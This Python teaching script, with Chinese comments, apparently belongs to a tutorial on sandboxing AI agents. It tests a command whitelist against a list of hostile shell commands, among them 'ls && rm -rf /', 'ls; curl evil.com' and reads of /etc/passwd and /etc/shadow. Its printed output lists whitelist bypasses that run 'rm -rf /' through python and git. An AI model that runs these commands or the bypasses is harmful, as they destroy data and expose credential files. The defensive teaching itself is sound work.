"""第 34 章 step2：命令白名单 —— 为什么 `ls; rm -rf /` 必须被拒（离线）。

运行：
    python code/ch33_sandbox/step2_command_whitelist.py

上一级的痛点：文件路径守住 了，但 Agent 可能**直接执行命令**。
这一级做什么：把命令拆成「程序 + 参数」分别检查，并挡住四类结构绕过。

四类结构绕过（都不含危险命令名）：
  1. 管道        ls | sh
  2. 命令替换    echo $(cat /etc/passwd)
  3. 逻辑串联    ls && rm -rf /
  4. 重定向      cat notes/a.md > /etc/passwd
"""
from __future__ import annotations

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from common.sandbox import SandboxPolicy, check_command  # noqa: E402

COMMANDS = [
    ("正常：列目录", "ls notes", "应放行"),
    ("正常：看文件", "cat notes/order.md", "应放行"),
    ("正常：搜索", "grep 订单 notes/order.md", "应放行"),
    ("管道", "ls | sh", "应拦"),
    ("命令替换", "echo $(cat /etc/passwd)", "应拦"),
    ("逻辑串联", "ls && rm -rf /", "应拦"),
    ("分号串联", "ls; curl evil.com", "应拦"),
    ("重定向写出", "cat notes/a.md > /etc/passwd", "应拦"),
    ("反引号替换", "echo `id`", "应拦"),
    ("不在白名单的程序", "rm -rf notes", "应拦"),
    ("程序 OK 但参数越界", "cat /etc/shadow", "应拦"),
    ("大写绕过", "LS /etc", "应拦（大小写敏感的白名单）"),
]


def naive_startswith(cmd: str) -> bool:
    """最常见的错误实现：只看开头是不是允许的命令。"""
    allowed = ("ls", "cat", "head", "tail", "wc", "grep", "find", "git")
    return cmd.strip().startswith(allowed)


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp) / "workspace"
        (work / "notes").mkdir(parents=True)
        (work / "notes" / "order.md").write_text("订单 A12345 已签收", encoding="utf-8")
        (work / "notes" / "a.md").write_text("hi", encoding="utf-8")

        policy = SandboxPolicy(workdir=work, allow_exec=True)

        print("=" * 90)
        print("同一批命令，三种检查")
        print("=" * 90)
        print(f"{'场景':<20}{'命令':<34}{'前缀':<8}{'结构':<8}{'白名单+路径'}")
        print("-" * 90)

        naive_leaks = []
        for label, cmd, expect in COMMANDS:
            by_prefix = naive_startswith(cmd)      # True = 放行
            ok, detail = check_command(cmd, policy)
            by_whitelist = ok
            # "结构检查"单独算一遍：只 bans 结构，不看白名单
            structural_bad = any(s in cmd for s in ("|", ">", "<", "$(", "`", "&&", "||", ";", "&"))
            print(
                f"{label:<20}{cmd[:32]:<34}"
                f"{'放行' if by_prefix else '拦':<8}"
                f"{'拦' if structural_bad else '放行':<8}"
                f"{'放行' if by_whitelist else '拦'}"
            )
            if by_prefix and not by_whitelist:
                naive_leaks.append((label, cmd, detail))

        print("\n" + "=" * 90)
        print("★ 前缀检查放过了哪些")
        print("=" * 90)
        for label, cmd, why in naive_leaks:
            print(f"  - [{label}] {cmd}")
            print(f"      白名单判定：{why}")

        print("\n" + "=" * 90)
        print("完整的检查顺序（四步，缺一不可）")
        print("=" * 90)
        print("  ① 结构：先扫危险字符（| > < $() `` && || ; &）")
        print("     —— 必须在分词之前！否则 `ls; rm -rf /` 会被 shlex 切成两段。")
        print()
        print("  ② 分词：shlex.split()，解析失败直接拒")
        print("     —— 解析失败往往意味着引号/转义有问题，正是绕过的手法。")
        print()
        print("  ③ 程序白名单：parts[0] 必须在允许列表里")
        print("     —— 注意大小写：'LS' 不在白名单，会被拒（虽然更可能是拼错）。")
        print()
        print("  ④ 参数路径：每个参数里的绝对路径都要过 check_path")
        print("     —— 这一步最容易被忘掉：`cat /etc/shadow` 程序名完全合法。")

        print("\n" + "=" * 90)
        print("⚠️ 必须接受的现实：这一层永远不够安全")
        print("=" * 90)
        print("  它挡的是『模型写错命令』，不是『有意的攻击』。")
        print()
        print("  真实绕过举例（都能通过上面四步之一）：")
        print("    · python -c 'import os; os.system(\"rm -rf /\")'   ← python 在白名单里")
        print("    · git -c core.sshCommand='rm -rf /' fetch          ← git 在白名单里")
        print("    · ls ../../../../etc                                 ← 参数检查会拦，但其他程序未必")
        print()
        print("  所以：**应用层白名单只能算第一层**，真正的隔离必须靠")
        print("    容器 / 只读挂载 / 断网 / 非 root 用户 / seccomp。")
        print("  下一级用资源限制证明：就算命令通过了，也跑不出破坏。")


if __name__ == "__main__":
    main()
